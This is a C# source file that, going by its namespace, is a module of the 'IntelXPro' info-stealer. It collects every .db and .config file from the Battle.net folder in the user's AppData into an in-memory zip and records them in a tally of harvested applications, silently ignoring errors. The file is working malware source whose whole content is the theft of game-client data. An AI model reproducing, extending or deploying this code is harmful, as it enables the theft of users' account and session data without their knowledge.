using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class BattleNet : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");
            if (!Directory.Exists(path))
            {
                return;
            }
            string[] obj = new string[2] { "*.db", "*.config" };
            Counter.CounterApplications counterApplications = new Counter.CounterApplications
            {
                Name = "BattleNet"
            };
            string[] array = obj;
            foreach (string searchPattern in array)
            {
                string[] files = Directory.GetFiles(path, searchPattern, SearchOption.AllDirectories);
                foreach (string fileName in files)
                {
                    try
                    {
                        FileInfo fileInfo = new FileInfo(fileName);
                        string text = Path.Combine(Path.Combine("BattleNet", (fileInfo.Directory?.Name == "Battle.net") ? "" : fileInfo.Directory?.Name), fileInfo.Name);
                        zip.AddFile(text, File.ReadAllBytes(fileInfo.FullName));
                        counterApplications.Files.Add(fileInfo.FullName + " => " + text);
                    }
                    catch
                    {
                    }
                }
            }
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("BattleNet\\");
                counter.Games.Add(counterApplications);
            }
        }
    }
}
